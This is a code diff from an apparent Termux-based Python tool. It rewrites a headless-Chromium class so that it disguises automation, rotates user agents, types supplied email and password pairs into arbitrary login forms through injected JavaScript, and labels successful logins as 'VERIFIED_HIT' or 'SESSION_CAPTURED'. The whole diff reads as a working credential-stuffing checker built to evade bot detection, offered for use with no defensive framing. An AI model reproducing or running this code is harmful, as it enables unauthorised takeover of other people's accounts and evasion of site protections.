@@ -584,142 +584,107 @@ def check_for_updates():
     
     wait_enter()
     
- # ── REAL CHROME ENGINE: FORENSIC CDP ──
-class RealChrome:
-    def __init__(self):
-        self.proc = None
-        # Locate Chromium binary in Termux
-        self.chrome_path = shutil.which("chromium") or shutil.which("google-chrome-stable")
-
-    def _start(self):
-        """Launches Headless Chromium with Stability Verification"""
-        if not self.chrome_path:
-            raise Exception("Chromium binary not found in system path")
-            
-        # Use a stable Termux-local path for profiles to avoid permission errors
-        self.profile = f"/data/data/com.termux/files/home/.chrome_profile_{uuid.uuid4().hex[:8]}"
-        
-        args = [
-            self.chrome_path, 
-            "--remote-debugging-port=9222", 
-            "--headless=new",
-            "--no-sandbox", 
-            "--disable-gpu", 
-            "--disable-dev-shm-usage",
-            f"--user-data-dir={self.profile}",
-            "--remote-debugging-address=127.0.0.1" # Force binding for local requests
-        ]
-        self.proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        
-        # ── STABILITY GUARD: Fixes "CDP Interface unreachable" ──
-        for _ in range(15):
-            try:
-                if requests.get("http://127.0.0.1:9222/json/version", timeout=1).status_code == 200:
-                    return True
-            except:
-                pass
-            time.sleep(1)
-        raise Exception("Engine failed to bind to port 9222")
-
-    def _stop(self):
-        """Force Terminate Engine Instance and Cleanup"""
-        if self.proc:
-            try:
-                self.proc.terminate()
-                self.proc.wait(timeout=2)
-            except:
-                self.proc.kill()
-            self.proc = None
-            # Cleanup profile to save Termux storage
-            if os.path.exists(self.profile):
-                shutil.rmtree(self.profile, ignore_errors=True)
-
-    def _get_ws_url(self):
-        """Retrieves the WebSocket Debugger URL from the Local Host"""
-        try:
-            resp = requests.get("http://127.0.0.1:9222/json/version", timeout=5)
-            return resp.json()["webSocketDebuggerUrl"]
-        except:
-            raise Exception("CDP Interface unreachable")
-
-    def _execute_cdp(self, ws_url, method, params={}):
-        """Handles Raw WebSocket Communication with the Chrome Engine"""
-        import websocket # Ensure 'pip install websocket-client' is in dependencies
-        try:
-            ws = websocket.create_connection(ws_url, timeout=15)
-            msg_id = random.randint(1, 1000)
-            payload = json.dumps({"id": msg_id, "method": method, "params": params})
-            ws.send(payload)
-            
-            # Listen for the specific response ID
-            while True:
-                result = json.loads(ws.recv())
-                if result.get("id") == msg_id:
-                    ws.close()
-                    return result
-        except Exception as e:
-            return {"error": str(e)}
-
-    def login(self, url, email, password):
-        res = {'link': url, 'email': email, 'pass': password, 'active': False, 'info': ''}
-        try:
-            self._start()
-            ws = self._get_ws_url()
-
-            # 1. NAVIGATE TO TARGET
-            self._execute_cdp(ws, "Page.navigate", {"url": url})
-            time.sleep(6) # Sufficient time for Cloudflare/JS heavy sites
-
-            # 2. INJECT CREDENTIALS (Advanced Selector Mesh)
-            js_inject = f"""
-            (function() {{
-                const e = document.querySelector('input[type="email"], input[type="text"], input[name*="user"], input[id*="login"]');
-                const p = document.querySelector('input[type="password"]');
-                if (e) {{ 
-                    e.focus(); e.value = '{email}'; 
-                    e.dispatchEvent(new Event('input', {{ bubbles: true }})); 
-                }}
-                if (p) {{ 
-                    p.focus(); p.value = '{password}'; 
-                    p.dispatchEvent(new Event('input', {{ bubbles: true }})); 
-                }}
-                const b = document.querySelector('button[type="submit"], input[type="submit"], button.login-btn, #submit');
-                if (b) b.click(); else if (p && p.form) p.form.submit();
-                return "injected";
-            }})();
-            """
-            self._execute_cdp(ws, "Runtime.evaluate", {"expression": js_inject})
-            time.sleep(6) # Wait for redirect/authentication response
-
-            # 3. VERIFY SESSION INTEGRITY (Forensic Check)
-            check_logic = """
-            (function() {{
-                const keywords = ['logout', 'signout', 'my account', 'dashboard', 'settings', 'profile'];
-                const body = document.body.innerText.toLowerCase();
-                const hasKey = keywords.some(k => body.includes(k));
-                const cookieCheck = document.cookie.length > 20;
-                return {{ active: hasKey || (cookieCheck && !window.location.href.includes('login')), url: window.location.href }};
-            }})();
-            """
-            # returnByValue: True is MANDATORY to get the result back
-            eval_res = self._execute_cdp(ws, "Runtime.evaluate", {"expression": check_logic, "returnByValue": True})
-            data = eval_res.get("result", {}).get("value", {})
-
-            if data.get("active"):
-                res['active'] = True
-                res['info'] = "VERIFIED_HIT"
-            elif url.lower() not in data.get("url", "").lower():
-                res['active'] = True
-                res['info'] = "REDIRECT_HIT"
-            else:
-                res['active'] = False
-                res['info'] = "INVALID"
-
-        except Exception as e:
-            res['info'] = f"ERR: {str(e)[:15]}"
-        finally:
-            self._stop()
-        return res
+ # ── REAL CHROME ENGINE: NUCLEAR STEALTH CDP ──
+ class RealChrome:
+     def __init__(self):
+         self.proc = None
+         self.chrome_path = shutil.which("chromium")
+     def _start(self):
+         """Launches Chromium with Nuclear Stealth Masking"""
+         self.profile = f"/data/data/com.termux/files/home/.chrome_nuclear_{uuid.uuid4().hex[:5]}"
+         args = [
+             self.chrome_path, "--remote-debugging-port=9222", "--headless=new",
+             "--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage",
+             f"--user-data-dir={self.profile}",
+             "--disable-blink-features=AutomationControlled", # Hides 'Bot' status
+             "--remote-debugging-address=127.0.0.1",
+             f"--user-agent={random.choice(USER_AGENTS)}"
+         ]
+         self.proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+         
+         # Stability Loop
+         for _ in range(15):
+             try:
+                 if requests.get("http://127.0.0.1:9222/json/version", timeout=1).status_code == 200:
+                     return True
+             except: pass
+             time.sleep(1)
+         raise Exception("ENGINE_TIMEOUT")
+     def login(self, url, email, password):
+         res = {'link':url, 'email':email, 'pass':password, 'active':False, 'info':''}
+         try:
+             self._start()
+             ws_url = requests.get("http://127.0.0.1:9222/json/version").json()['webSocketDebuggerUrl']
+             conn = websocket.create_connection(ws_url, timeout=15)
+             def cdp(method, params={}):
+                 mid = random.randint(1,1000)
+                 conn.send(json.dumps({"id": mid, "method": method, "params": params}))
+                 while True:
+                     r = json.loads(conn.recv())
+                     if r.get("id") == mid: return r
+             # 1. NAVIGATION
+             cdp("Page.navigate", {"url": url})
+             time.sleep(8)
+             # 2. NUCLEAR INJECTION (Simulates Real Keyboard Input)
+             inject_js = f"""
+             (function() {{
+                 const q = (s) => document.querySelector(s);
+                 const inputs = Array.from(document.querySelectorAll('input'));
+                 const e = inputs.find(i => /email|user|login|id/i.test(i.name || i.id || i.type));
+                 const p = inputs.find(i => i.type === 'password' || /pass|pwd/i.test(i.name || i.id));
+                 
+                 if(!e || !p) return "ERR_FIELDS";
+                 
+                 // Human Keyboard Simulation
+                 e.focus(); document.execCommand('insertText', false, '{email}');
+                 e.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                 
+                 p.focus(); document.execCommand('insertText', false, '{password}');
+                 p.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                 
+                 const btn = q('button[type="submit"], input[type="submit"], [class*="login"], [id*="login"]');
+                 if(btn) btn.click(); else if(p.form) p.form.submit();
+                 return "SUBMITTED";
+             }})();
+             """
+             cdp("Runtime.evaluate", {"expression": inject_js})
+             time.sleep(10) # Essential wait for session drop
+             # 3. TRUTH-BASED VERIFICATION
+             verify_js = """
+             (function() {
+                 const body = document.body.innerText.toLowerCase();
+                 const url = window.location.href.toLowerCase();
+                 const cookies = document.cookie;
+                 
+                 const success = ['logout', 'signout', 'dashboard', 'my account', 'welcome', 'settings'];
+                 const bad = ['incorrect', 'invalid', 'wrong', 'error', 'failed', 'captcha', 'robot'];
+                 
+                 const isHit = success.some(k => body.includes(k));
+                 const isRedirected = !url.includes('login') && !url.includes('signin') && cookies.length > 30;
+                 const isBad = bad.some(k => body.includes(k));
+                 if (isHit) return "VERIFIED_HIT";
+                 if (isRedirected && !isBad) return "SESSION_CAPTURED";
+                 if (isBad) return "INVALID_CREDENTIALS";
+                 return "STUCK_OR_BLOCKED";
+             })();
+             """
+             check = cdp("Runtime.evaluate", {"expression": verify_js, "returnByValue": True})
+             status = check['result'].get('value', 'UNKNOWN')
+             if "HIT" in status or "SESSION" in status:
+                 res['active'] = True; res['info'] = status
+             else:
+                 res['active'] = False; res['info'] = status
+             
+             conn.close()
+         except Exception as e:
+             res['info'] = f"ERR:{str(e)[:15]}"
+         finally:
+             if self.proc:
+                 self.proc.terminate()
+                 shutil.rmtree(self.profile, ignore_errors=True)
+         return res
+ # ── ENGINE INITIALIZATION ──
+ chrome = RealChrome()
 
 # ── HTTP FALLBACK: SIGNAL RECOVERY ENGINE ──
 def http_login(url, email, password):
